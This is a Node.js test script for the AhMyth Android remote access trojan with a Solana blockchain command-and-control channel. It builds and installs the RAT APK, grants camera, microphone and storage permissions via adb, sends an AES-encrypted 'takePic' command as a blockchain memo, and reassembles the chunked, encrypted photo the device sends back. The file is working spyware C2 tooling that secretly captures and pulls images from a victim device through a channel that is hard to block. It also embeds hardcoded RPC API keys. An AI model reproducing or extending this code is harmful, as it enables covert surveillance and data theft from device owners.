#!/usr/bin/env node
/**
 * Blockchain Server Emulator - Image Sending Test
 * - Builds APK from latest source
 * - Installs on emulator
 * - Launches app
 * - Sends blockchain camera capture command
 * - Polls for chunked photo response
 * - Assembles chunks and verifies image is saved
 */

const { exec } = require('child_process');
const { promisify } = require('util');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const bs58Mod = require('bs58');
const {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  sendAndConfirmTransaction
} = require('@solana/web3.js');

const execAsync = promisify(exec);
const bs58 = bs58Mod.default || bs58Mod;
const { encode: b58encode, decode: b58decode } = bs58;

// Configuration
const PACKAGE_NAME = 'ahmyth.mine.king.ahmyth';
const CLIENT_DIR = path.join(__dirname, 'AhMyth-Client');
const APK_OUTPUT = path.join(CLIENT_DIR, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
const TEST_TIMEOUT = 300000; // 5 minutes for blockchain (chunked transfers take longer)
const IMAGE_WAIT_TIMEOUT = 240000; // 4 minutes for image chunks

// Colors
const colors = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    cyan: "\x1b[36m",
    blue: "\x1b[34m"
};

function log(msg, type = 'info') {
    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
    let color = colors.reset;
    switch(type) {
        case 'success': color = colors.green; break;
        case 'error': color = colors.red; break;
        case 'warn': color = colors.yellow; break;
        case 'header': color = colors.cyan; break;
        case 'info': color = colors.blue; break;
    }
    console.log(`${color}[${timestamp}] ${msg}${colors.reset}`);
}

// Load blockchain config
const repoRoot = __dirname;
const keysEnvPath = path.join(repoRoot, '.blockchain-keys.env');
const contractEnvPath = path.join(repoRoot, '.blockchain-contract.env');

function parseEnvFile(filePath) {
  if (!fs.existsSync(filePath)) return {};
  return fs.readFileSync(filePath, 'utf8')
    .split(/\r?\n/)
    .reduce((acc, line) => {
      const match = line.trim().match(/^([^=#]+)=(.*)$/);
      if (match) {
        acc[match[1].trim()] = match[2].trim();
      }
      return acc;
    }, {});
}

const env = { ...parseEnvFile(keysEnvPath), ...parseEnvFile(contractEnvPath), ...process.env };

// Build RPC list same as Electron GUI (LabCtrl.js)
function buildRpcCandidates() {
  const defaultAlchemyKey = env.SOLANA_ALCHEMY_KEY || env.ALCHEMY_API_KEY || env.SOLANA_ALCHEMY_API_KEY || 'iYpa8brgKRSbCQ9rb1tx8';
  const heliusKey = env.SOLANA_HELIUS_KEY || env.HELIUS_API_KEY;
  
  // Split comma-separated RPC URLs
  function splitRpcList(rpcList) {
    if (!rpcList) return [];
    return rpcList.split(',').map(s => s.trim()).filter(Boolean);
  }
  
  const rpcCandidates = [
    // Primary RPCs from env
    env.BLOCKCHAIN_RPC_URL,
    env.SOLANA_RPC_URL,
    ...splitRpcList(env.BLOCKCHAIN_RPC_FALLBACKS),
    ...splitRpcList(env.SOLANA_RPC_FALLBACKS),
    // Helius mainnet RPC (10 req/s limit - prioritize this)
    'https://mainnet.helius-rpc.com/?api-key=288d548c-1be7-4db4-86c3-60300d282efa',
    // Helius with API key if available
    heliusKey ? `https://rpc.helius.xyz/?api-key=${heliusKey}&network=devnet` : null,
    heliusKey ? `https://devnet.helius-rpc.com/?api-key=${heliusKey}` : null,
    heliusKey ? `https://mainnet.helius-rpc.com/?api-key=${heliusKey}` : null,
    // Alchemy with API key
    `https://solana-devnet.g.alchemy.com/v2/${defaultAlchemyKey}`,
    // Public fallbacks
    'https://api.devnet.solana.com',
    'https://api.testnet.solana.com',
    'https://rpc.ankr.com/solana_devnet',
    // Helius devnet demo key (fallback)
    'https://devnet.helius-rpc.com/?api-key=288d548c-1be7-4db4-86c3-60300d282efa'
  ].filter(Boolean).filter((url, index, self) => {
    // Remove duplicates
    return self.indexOf(url) === index;
  }).filter(url => {
    // Filter out demo keys and unstable ones (same as main.js)
    return !url.includes('alchemy') || url.includes(`/v2/${defaultAlchemyKey}`) || !url.includes('demo');
  });
  
  return rpcCandidates;
}

const RPC_CANDIDATES = buildRpcCandidates();

const CHANNEL_ADDRESS = env.SOLANA_CHANNEL_ADDRESS || env.BLOCKCHAIN_CONTRACT_ADDRESS;
const PRIVATE_KEY_B58 = env.BLOCKCHAIN_PRIVATE_KEY;
const CLIENT_PUBLIC_KEY = env.BLOCKCHAIN_CLIENT_ADDRESS || (env.BLOCKCHAIN_CLIENT_PRIVATE_KEY ? 
  Keypair.fromSecretKey(b58decode(env.BLOCKCHAIN_CLIENT_PRIVATE_KEY)).publicKey.toBase58() : null);
const AES_KEY_HEX = env.BLOCKCHAIN_C2_AES_KEY;

// AES encryption/decryption
function encryptAES(plaintext, keyHex) {
  const key = Buffer.from(keyHex, 'hex');
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  let encrypted = cipher.update(plaintext, 'utf8');
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  const authTag = cipher.getAuthTag();
  return Buffer.concat([iv, authTag, encrypted]).toString('hex');
}

function decryptAES(ciphertextHex, keyHex) {
    try {
        const key = Buffer.from(keyHex, 'hex');
        const data = Buffer.from(ciphertextHex, 'hex');
        if (data.length < 28) return null; // nonce (12) + authTag (16) + min data
        
        const nonce = data.slice(0, 12);
        const authTag = data.slice(-16);
        const encrypted = data.slice(12, -16);
        
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, nonce);
        decipher.setAuthTag(authTag);
        let decrypted = decipher.update(encrypted);
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        return decrypted.toString('utf8');
    } catch (e) {
        return null;
    }
}

// Extract memos from transaction
function extractMemosFromTx(tx) {
  const memos = [];
  if (!tx || !tx.meta || !tx.meta.logMessages) return memos;
  
  for (const logMsg of tx.meta.logMessages) {
    const memoMatch = logMsg.match(/Program log: Memo \(len \d+\): "?(.+?)"?$/);
    if (memoMatch && memoMatch[1]) {
      memos.push(memoMatch[1]);
    }
  }
  return memos;
}

async function checkAdbDevice() {
    try {
        const { stdout } = await execAsync('adb devices');
        const lines = stdout.split('\n').filter(line => line.trim() && !line.includes('List of devices'));
        const devices = lines.filter(line => line.includes('device') && !line.includes('offline'));
        
        if (devices.length === 0) {
            log('No ADB devices found', 'error');
            return null;
        }
        
        const deviceId = devices[0].split('\t')[0];
        log(`Found device: ${deviceId}`, 'success');
        return deviceId;
    } catch (error) {
        log(`ADB check failed: ${error.message}`, 'error');
        return null;
    }
}

async function buildApk() {
    log('Building APK from latest source...', 'header');
    
    try {
        // Clean first
        log('Cleaning previous build...', 'info');
        await execAsync('cd AhMyth-Client && gradlew.bat clean', { 
            cwd: __dirname,
            maxBuffer: 10 * 1024 * 1024 
        });
        
        // Build debug APK
        log('Building debug APK...', 'info');
        const { stdout, stderr } = await execAsync('cd AhMyth-Client && gradlew.bat assembleDebug', {
            cwd: __dirname,
            maxBuffer: 10 * 1024 * 1024
        });
        
        if (stderr && !stderr.includes('Warning')) {
            log(`Build warnings: ${stderr.substring(0, 200)}`, 'warn');
        }
        
        // Check if APK exists
        if (!fs.existsSync(APK_OUTPUT)) {
            throw new Error('APK not found after build');
        }
        
        const apkSize = fs.statSync(APK_OUTPUT).size;
        log(`APK built successfully: ${(apkSize / 1024 / 1024).toFixed(2)} MB`, 'success');
        return APK_OUTPUT;
    } catch (error) {
        log(`Build failed: ${error.message}`, 'error');
        throw error;
    }
}

async function installApk(deviceId, apkPath) {
    log(`Installing APK on device ${deviceId}...`, 'header');
    
    try {
        // Uninstall first to ensure clean install
        log('Uninstalling existing app...', 'info');
        try {
            await execAsync(`adb -s ${deviceId} uninstall ${PACKAGE_NAME}`);
        } catch (e) {
            // Ignore if not installed
        }
        
        // Install
        log('Installing APK...', 'info');
        const { stdout, stderr } = await execAsync(`adb -s ${deviceId} install -r "${apkPath}"`);
        
        if (stderr && !stderr.includes('Success')) {
            throw new Error(`Install failed: ${stderr}`);
        }
        
        log('APK installed successfully', 'success');
        return true;
    } catch (error) {
        log(`Install failed: ${error.message}`, 'error');
        throw error;
    }
}

async function grantPermissions(deviceId) {
    log('Granting camera permissions...', 'header');
    
    try {
        // Grant camera permission
        await execAsync(`adb -s ${deviceId} shell pm grant ${PACKAGE_NAME} android.permission.CAMERA`);
        log('Camera permission granted', 'success');
        
        // Grant other essential permissions
        const permissions = [
            'android.permission.RECORD_AUDIO',
            'android.permission.READ_EXTERNAL_STORAGE',
            'android.permission.WRITE_EXTERNAL_STORAGE',
            'android.permission.POST_NOTIFICATIONS'
        ];
        
        for (const perm of permissions) {
            try {
                await execAsync(`adb -s ${deviceId} shell pm grant ${PACKAGE_NAME} ${perm}`);
            } catch (e) {
                // Ignore individual permission failures
            }
        }
    } catch (error) {
        log(`Permission grant failed: ${error.message}`, 'warn');
        // Continue anyway
    }
}

async function launchApp(deviceId) {
    log('Launching app...', 'header');
    
    try {
        // Grant permissions first
        await grantPermissions(deviceId);
        
        // Start main activity
        await execAsync(`adb -s ${deviceId} shell am start -n ${PACKAGE_NAME}/.MainActivity`);
        log('App launched', 'success');
        
        // Wait a bit for app to initialize
        await new Promise(resolve => setTimeout(resolve, 5000));
        return true;
    } catch (error) {
        log(`Launch failed: ${error.message}`, 'error');
        throw error;
    }
}

// RPC rotation with rate limit tracking (same as main.js)
const rpcRateLimitMap = new Map(); // rpc -> { last429: timestamp, consecutive429s: number }
let currentRpcIndex = 0;

function getAvailableRpcs() {
    return RPC_CANDIDATES.filter(rpc => {
        const rateLimit = rpcRateLimitMap.get(rpc);
        if (!rateLimit) return true;
        // If last 429 was more than 60 seconds ago, try again
        if (Date.now() - rateLimit.last429 > 60000) {
            rateLimit.consecutive429s = 0;
            return true;
        }
        // Skip if too many consecutive 429s
        return rateLimit.consecutive429s < 5;
    });
}

async function getConnection(startIndex = null) {
    const availableRpcs = getAvailableRpcs();
    
    if (availableRpcs.length === 0) {
        // Reset all after 60 seconds
        rpcRateLimitMap.clear();
        log('All RPCs rate-limited, resetting...', 'warn');
        // Try again with all RPCs
        return getConnection(0);
    }
    
    // Rotate through available RPCs
    const startIdx = startIndex !== null ? startIndex : (currentRpcIndex % availableRpcs.length);
    
    for (let i = 0; i < availableRpcs.length; i++) {
        const idx = (startIdx + i) % availableRpcs.length;
        const rpc = availableRpcs[idx];
        
        try {
            const c = new Connection(rpc, 'confirmed');
            await c.getLatestBlockhash('confirmed');
            
            // Clear rate limit on success
            if (rpcRateLimitMap.has(rpc)) {
                rpcRateLimitMap.delete(rpc);
            }
            
            currentRpcIndex = idx;
            return { conn: c, rpcUsed: rpc, rpcIndex: idx };
        } catch (err) {
            // Track 429 errors
            if (err.message && err.message.includes('429')) {
                let rateLimit = rpcRateLimitMap.get(rpc);
                if (!rateLimit) {
                    rateLimit = { last429: Date.now(), consecutive429s: 0 };
                }
                rateLimit.last429 = Date.now();
                rateLimit.consecutive429s++;
                rpcRateLimitMap.set(rpc, rateLimit);
                log(`RPC rate limited: ${rpc.substring(0, 40)}... (${rateLimit.consecutive429s}x)`, 'warn');
            }
            continue;
        }
    }
    
    throw new Error('No RPC available');
}

async function sendBlockchainCommand(eventName, payload = {}) {
    if (!CHANNEL_ADDRESS || !PRIVATE_KEY_B58 || !AES_KEY_HEX) {
        throw new Error('Missing blockchain configuration. Run: npm run generate:keys');
    }
    
    const connResult = await getConnection();
    const conn = connResult.conn;
    const rpcUsed = connResult.rpcUsed;
    log(`Using RPC: ${rpcUsed.substring(0, 50)}...`, 'info');
    
    const operatorKeypair = Keypair.fromSecretKey(b58decode(PRIVATE_KEY_B58));
    const channelPubkey = new PublicKey(CHANNEL_ADDRESS);
    
    // Prepare command (match format from blockchain-operator.js)
    const command = {
        action: eventName,
        data: payload,
        timestamp: Date.now()
    };
    
    const commandJson = JSON.stringify(command);
    log(`Sending command: ${eventName}`, 'info');
    
    // Encrypt command (match format from blockchain-operator.js)
    const key = Buffer.from(AES_KEY_HEX, 'hex');
    const nonce = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, nonce);
    const encrypted = Buffer.concat([cipher.update(commandJson, 'utf8'), cipher.final()]);
    const tag = cipher.getAuthTag();
    const encryptedBuffer = Buffer.concat([nonce, encrypted, tag]);
    const encryptedHex = encryptedBuffer.toString('hex');
    
    const memoText = `CMD:${encryptedHex}`;
    
    // Create transaction with memo (match format from blockchain-operator.js)
    const transaction = new Transaction();
    
    // Add small transfer to keep channel in account keys
    transaction.add(
        SystemProgram.transfer({
            fromPubkey: operatorKeypair.publicKey,
            toPubkey: channelPubkey,
            lamports: 1
        })
    );
    
    // Add memo instruction
    transaction.add(
        new TransactionInstruction({
            keys: [{ pubkey: operatorKeypair.publicKey, isSigner: true, isWritable: true }],
            programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
            data: Buffer.from(memoText, 'utf8')
        })
    );
    
    // Get recent blockhash
    const { blockhash } = await conn.getLatestBlockhash('confirmed');
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = operatorKeypair.publicKey;
    
    // Sign and send
    transaction.sign(operatorKeypair);
    const signature = await sendAndConfirmTransaction(conn, transaction, [operatorKeypair], {
        commitment: 'confirmed',
        skipPreflight: true,
        maxRetries: 3
    });
    
    log(`Command sent - Tx: ${signature}`, 'success');
    return { signature, rpc: rpcUsed };
}

async function pollForChunkedResponse(expectedEvent, timeoutMs = IMAGE_WAIT_TIMEOUT) {
    if (!CHANNEL_ADDRESS || !CLIENT_PUBLIC_KEY || !AES_KEY_HEX) {
        throw new Error('Missing blockchain configuration');
    }
    
    let connResult = await getConnection();
    let conn = connResult.conn;
    let rpcUsed = connResult.rpcUsed;
    let rpcIndex = connResult.rpcIndex;
    
    const clientPubkey = new PublicKey(CLIENT_PUBLIC_KEY);
    const channelPubkey = new PublicKey(CHANNEL_ADDRESS);
    
    const chunkBuffers = new Map(); // chunkId -> { total, parts: Array, received: number }
    const seenSignatures = new Set();
    const startTime = Date.now();
    let lastProgressLog = 0;
    let consecutive429s = 0;
    
    log(`Polling for ${expectedEvent} response (timeout: ${timeoutMs}ms)...`, 'info');
    
    while (Date.now() - startTime < timeoutMs) {
        try {
            // Poll from channel address (where client sends responses)
            // The client sends RESPCH: memos to the channel address
            let sigInfos = [];
            try {
                sigInfos = await conn.getSignaturesForAddress(channelPubkey, {
                    limit: 200, // Increase limit significantly to catch all chunks
                    commitment: 'confirmed'
                });
            } catch (e) {
                if (e.message && e.message.includes('429')) {
                    log(`Rate limited, waiting longer...`, 'warn');
                    await new Promise(resolve => setTimeout(resolve, 5000));
                    continue;
                }
                log(`RPC error: ${e.message}`, 'warn');
                // Try to reconnect with different RPC
                try {
                    const connResult = await getConnection((rpcIndex + 1) % RPC_CANDIDATES.length);
                    if (connResult.rpcUsed !== rpcUsed) {
                        conn = connResult.conn;
                        rpcUsed = connResult.rpcUsed;
                        rpcIndex = connResult.rpcIndex;
                        log(`Switched to RPC: ${rpcUsed}`, 'info');
                    }
                } catch (e2) {
                    // All RPCs failed, continue with current
                }
                await new Promise(resolve => setTimeout(resolve, 3000));
                continue;
            }
            
            let newChunksFound = 0;
            
            for (const info of sigInfos) {
                if (!info || !info.signature) continue;
                if (seenSignatures.has(info.signature)) continue;
                seenSignatures.add(info.signature);
                
                try {
                    const tx = await conn.getParsedTransaction(info.signature, {
                        commitment: 'confirmed',
                        maxSupportedTransactionVersion: 0
                    });
                    
                    if (!tx) continue;
                    
                    const memos = extractMemosFromTx(tx);
                    
                    for (const memo of memos) {
                        if (!memo) continue;
                        
                        // Handle chunked responses (RESPCH:)
                        if (memo.startsWith('RESPCH:')) {
                            const match = memo.match(/^RESPCH:([A-Za-z0-9]+):([0-9]+)\/([0-9]+):([0-9a-fA-F]+)$/);
                            if (match) {
                                const chunkId = match[1];
                                const part = parseInt(match[2], 10);
                                const total = parseInt(match[3], 10);
                                const chunkHex = match[4];
                                
                                let entry = chunkBuffers.get(chunkId);
                                if (!entry) {
                                    entry = { total, parts: new Array(total).fill(null), received: 0, startTime: Date.now() };
                                    log(`Starting chunked transfer: ${chunkId} (${total} chunks)`, 'info');
                                }
                                
                                if (!entry.parts[part - 1]) {
                                    entry.parts[part - 1] = chunkHex;
                                    entry.received = entry.parts.filter(p => p !== null).length;
                                    newChunksFound++;
                                }
                                chunkBuffers.set(chunkId, entry);
                                
                                // Log progress every 10 chunks or when complete
                                const now = Date.now();
                                if (entry.received % 10 === 0 || entry.received === entry.total || (now - lastProgressLog > 5000)) {
                                    const percent = Math.round((entry.received / entry.total) * 100);
                                    log(`Progress: ${entry.received}/${entry.total} chunks (${percent}%)`, 'info');
                                    lastProgressLog = now;
                                }
                                
                                // Check if complete
                                if (entry.received === entry.total) {
                                    // Verify all parts are present
                                    let allPartsPresent = true;
                                    const missing = [];
                                    for (let i = 0; i < entry.total; i++) {
                                        if (entry.parts[i] === null) {
                                            allPartsPresent = false;
                                            missing.push(i + 1);
                                        }
                                    }
                                    
                                    if (!allPartsPresent) {
                                        log(`Cannot assemble ${chunkId} - missing chunks: ${missing.slice(0, 10).join(', ')}`, 'warn');
                                        continue;
                                    }
                                    
                                    const assembled = entry.parts.join('');
                                    chunkBuffers.delete(chunkId);
                                    const elapsed = ((Date.now() - entry.startTime) / 1000).toFixed(1);
                                    log(`All ${total} chunks assembled (${elapsed}s)`, 'success');
                                    
                                    const decrypted = decryptAES(assembled, AES_KEY_HEX);
                                    if (decrypted) {
                                        try {
                                            const parsed = JSON.parse(decrypted);
                                            // Log the parsed response structure for debugging
                                            log(`Decrypted response structure: ${JSON.stringify(parsed).substring(0, 200)}...`, 'info');
                                            
                                            // Check both 'event' and 'action' fields
                                            if (parsed.event === expectedEvent || parsed.action === expectedEvent) {
                                                log(`Response received: ${expectedEvent}`, 'success');
                                                // Normalize to 'event' format
                                                if (parsed.action && !parsed.event) {
                                                    parsed.event = parsed.action;
                                                }
                                                return parsed;
                                            } else {
                                                // If event doesn't match but we have data, log it
                                                log(`Response event mismatch: expected ${expectedEvent}, got ${parsed.event || parsed.action || 'unknown'}`, 'warn');
                                            }
                                        } catch (e) {
                                            log(`Failed to parse decrypted JSON: ${e.message}`, 'warn');
                                            log(`Decrypted data (first 200 chars): ${decrypted.substring(0, 200)}`, 'warn');
                                        }
                                    } else {
                                        log(`Failed to decrypt assembled chunks for ${chunkId}`, 'error');
                                    }
                                }
                            }
                            continue;
                        }
                        
                        // Handle single responses (RESP:)
                        if (memo.startsWith('RESP:')) {
                            const decrypted = decryptAES(memo.substring(5), AES_KEY_HEX);
                            if (decrypted) {
                                try {
                                    const parsed = JSON.parse(decrypted);
                                    if (parsed.event === expectedEvent || parsed.action === expectedEvent) {
                                        log(`Response received: ${expectedEvent}`, 'success');
                                        if (parsed.action && !parsed.event) {
                                            parsed.event = parsed.action;
                                        }
                                        return parsed;
                                    }
                                } catch (e) {
                                    // Not JSON, continue
                                }
                            }
                        }
                    }
                } catch (txErr) {
                    // Transaction fetch error, continue
                    continue;
                }
            }
            
            // If no new chunks found and we have pending transfers, log status
            if (newChunksFound === 0 && chunkBuffers.size > 0) {
                for (const [chunkId, entry] of chunkBuffers.entries()) {
                    const elapsed = ((Date.now() - entry.startTime) / 1000).toFixed(1);
                    if (Date.now() - lastProgressLog > 10000) {
                        const percent = Math.round((entry.received / entry.total) * 100);
                        log(`Still waiting: ${entry.received}/${entry.total} chunks (${percent}%) - ${elapsed}s elapsed`, 'info');
                        lastProgressLog = Date.now();
                    }
                }
            }
            
        } catch (err) {
            if (err.message && err.message.includes('429')) {
                consecutive429s++;
                const backoffMs = Math.min(5000 * consecutive429s, 30000); // Max 30s backoff
                log(`Rate limited (${consecutive429s}x), waiting ${backoffMs}ms...`, 'warn');
                
                // Try switching RPC after 3 consecutive 429s
                if (consecutive429s >= 3 && RPC_CANDIDATES.length > 1) {
                    rpcIndex = (rpcIndex + 1) % RPC_CANDIDATES.length;
                    const newRpc = RPC_CANDIDATES[rpcIndex];
                    try {
                        const newConn = new Connection(newRpc, 'confirmed');
                        await newConn.getLatestBlockhash('confirmed');
                        conn = newConn;
                        rpcUsed = newRpc;
                        consecutive429s = 0;
                        log(`Switched to RPC: ${newRpc}`, 'info');
                } catch (e) {
                    // RPC switch failed, try to get new connection
                    try {
                        connResult = await getConnection((rpcIndex + 1) % RPC_CANDIDATES.length);
                        conn = connResult.conn;
                        rpcUsed = connResult.rpcUsed;
                        rpcIndex = connResult.rpcIndex;
                        consecutive429s = 0;
                        log(`Switched to RPC: ${rpcUsed}`, 'info');
                    } catch (e2) {
                        // All RPCs failed, continue with current
                    }
                }
            }
            
            await new Promise(resolve => setTimeout(resolve, backoffMs));
            } else {
                consecutive429s = 0; // Reset on non-429 error
                log(`Poll error: ${err.message}`, 'warn');
                await new Promise(resolve => setTimeout(resolve, 3000));
            }
            continue;
        }
        
        // Reset consecutive 429s on successful poll
        consecutive429s = 0;
        
        // Poll every 2-3 seconds to respect 10 req/s limit for Helius mainnet
        // With 10 req/s = 1 req per 100ms, but we make multiple requests per poll
        // (getSignaturesForAddress + getParsedTransaction per signature)
        // So 2-3 seconds between polls is safe
        await new Promise(resolve => setTimeout(resolve, 2500));
    }
    
    // Check final status
    if (chunkBuffers.size > 0) {
        log(`\n=== Final Status ===`, 'header');
        for (const [chunkId, entry] of chunkBuffers.entries()) {
            const percent = Math.round((entry.received / entry.total) * 100);
            const elapsed = ((Date.now() - entry.startTime) / 1000).toFixed(1);
            log(`Chunk ID ${chunkId}: ${entry.received}/${entry.total} chunks (${percent}%) - ${elapsed}s elapsed`, 'error');
            
            // List missing chunks
            const missing = [];
            for (let i = 0; i < entry.total; i++) {
                if (entry.parts[i] === null) {
                    missing.push(i + 1);
                }
            }
            if (missing.length > 0 && missing.length <= 20) {
                log(`Missing chunks: ${missing.join(', ')}`, 'warn');
            } else if (missing.length > 20) {
                log(`Missing ${missing.length} chunks (too many to list)`, 'warn');
            }
        }
        log(`\nNote: This may be due to RPC rate limiting. Try using a paid RPC endpoint.`, 'warn');
    }
    
    throw new Error(`Timeout waiting for ${expectedEvent} response`);
}

async function testBlockchainImageSending() {
    log('Starting blockchain image sending test...', 'header');
    
    try {
        // Step 1: Request camera capture
        log('Requesting camera capture...', 'info');
        const { signature: photoSig } = await sendBlockchainCommand('x0000ca', {
            action: 'takePic'
        });
        
        // Step 2: Poll for photo response (chunked)
        log('Polling for photo response (may be chunked)...', 'info');
        const photoResponse = await pollForChunkedResponse('x0000ca', IMAGE_WAIT_TIMEOUT);
        
        // Response format: { event: 'x0000ca', data: { image: true, buffer: ... } }
        let imageData = null;
        let errorMsg = null;
        
        if (photoResponse.data) {
            if (photoResponse.data.image === true && photoResponse.data.buffer) {
                imageData = photoResponse.data;
            } else if (photoResponse.data.error) {
                errorMsg = photoResponse.data.error;
            }
        } else if (photoResponse.image === true && photoResponse.buffer) {
            imageData = photoResponse;
        } else if (photoResponse.error) {
            errorMsg = photoResponse.error;
        }
        
        if (errorMsg) {
            throw new Error(`Camera error: ${errorMsg}`);
        }
        
        if (!imageData || !imageData.buffer) {
            throw new Error('Invalid photo response - no image data');
        }
        
        log('Photo received!', 'success');
        
        // Step 3: Save image
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const imageDir = path.join(__dirname, 'test-images');
        if (!fs.existsSync(imageDir)) {
            fs.mkdirSync(imageDir, { recursive: true });
        }
        
        const imagePath = path.join(imageDir, `test_photo_blockchain_${timestamp}.jpg`);
        
        let imageBuffer;
        if (typeof imageData.buffer === 'string') {
            // Base64 string
            imageBuffer = Buffer.from(imageData.buffer, 'base64');
        } else if (Array.isArray(imageData.buffer)) {
            // Byte array
            imageBuffer = Buffer.from(imageData.buffer);
        } else {
            throw new Error('Unknown buffer format');
        }
        
        fs.writeFileSync(imagePath, imageBuffer);
        const sizeKB = (imageBuffer.length / 1024).toFixed(2);
        const sizeMB = (imageBuffer.length / 1024 / 1024).toFixed(2);
        
        log(`Image saved successfully!`, 'success');
        log(`Path: ${imagePath}`, 'info');
        log(`Size: ${sizeKB} KB (${sizeMB} MB)`, 'info');
        console.log(`\n[Photo] ✓ Photo saved to: ${imagePath}`);
        console.log(`[Photo]   File: test_photo_blockchain_${timestamp}.jpg`);
        console.log(`[Photo]   Size: ${sizeMB} MB (${imageBuffer.length} bytes)`);
        
        // Check if server auto-saved it
        const os = require('os');
        const homedir = os.homedir();
        const downloadsPath = path.join(homedir, 'AhMyth', 'Downloads');
        let autoSavedPath = null;
        
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        if (fs.existsSync(downloadsPath)) {
            const files = fs.readdirSync(downloadsPath)
                .filter(f => f.startsWith('photo_') && f.endsWith('.jpg'))
                .map(f => ({
                    name: f,
                    path: path.join(downloadsPath, f),
                    time: fs.statSync(path.join(downloadsPath, f)).mtime
                }))
                .sort((a, b) => b.time - a.time);
            
            if (files.length > 0) {
                const recentFile = files[0];
                const fileAge = Date.now() - recentFile.time.getTime();
                if (fileAge < 300000) { // File created in last 5 minutes
                    autoSavedPath = recentFile.path;
                    const autoSize = (fs.statSync(autoSavedPath).size / 1024).toFixed(2);
                    log(`Image also auto-saved by server: ${autoSavedPath} (${autoSize} KB)`, 'success');
                }
            }
        }
        
        // Verify file
        if (fs.existsSync(imagePath) && fs.statSync(imagePath).size > 0) {
            return {
                success: true,
                imagePath: imagePath,
                autoSavedPath: autoSavedPath,
                size: imageBuffer.length,
                sizeKB: parseFloat(sizeKB)
            };
        } else {
            throw new Error('Image file was not saved correctly');
        }
    } catch (error) {
        log(`Test failed: ${error.message}`, 'error');
        throw error;
    }
}

async function main() {
    try {
        log('=== Blockchain Image Sending Auto-Test ===', 'header');
        
        // Validate config
        if (!CHANNEL_ADDRESS || !PRIVATE_KEY_B58 || !CLIENT_PUBLIC_KEY || !AES_KEY_HEX) {
            throw new Error('Missing blockchain configuration. Run: npm run generate:keys');
        }
        
        log(`Channel: ${CHANNEL_ADDRESS.substring(0, 16)}...`, 'info');
        log(`Client: ${CLIENT_PUBLIC_KEY.substring(0, 16)}...`, 'info');
        
        // Step 1: Check ADB device
        const deviceId = await checkAdbDevice();
        if (!deviceId) {
            throw new Error('No ADB device available');
        }
        
        // Step 2: Build APK
        const apkPath = await buildApk();
        
        // Step 3: Install APK
        await installApk(deviceId, apkPath);
        
        // Step 4: Launch app
        await launchApp(deviceId);
        
        // Step 5: Wait a bit for app to connect to blockchain
        log('Waiting for app to connect to blockchain...', 'info');
        await new Promise(resolve => setTimeout(resolve, 10000));
        
        // Step 6: Test blockchain image sending
        const result = await testBlockchainImageSending();
        
        log('=== Test Complete ===', 'header');
        log(`✓ Image received and saved successfully`, 'success');
        log(`  Test Path: ${result.imagePath}`, 'info');
        if (result.autoSavedPath) {
            log(`  Auto-saved Path: ${result.autoSavedPath}`, 'info');
        }
        log(`  Size: ${result.sizeKB} KB`, 'info');
        
        process.exit(0);
    } catch (error) {
        log(`=== Test Failed ===`, 'error');
        log(`Error: ${error.message}`, 'error');
        if (error.stack) {
            log(`Stack: ${error.stack}`, 'error');
        }
        process.exit(1);
    }
}

// Run if called directly
if (require.main === module) {
    main();
}

module.exports = { main, testBlockchainImageSending };

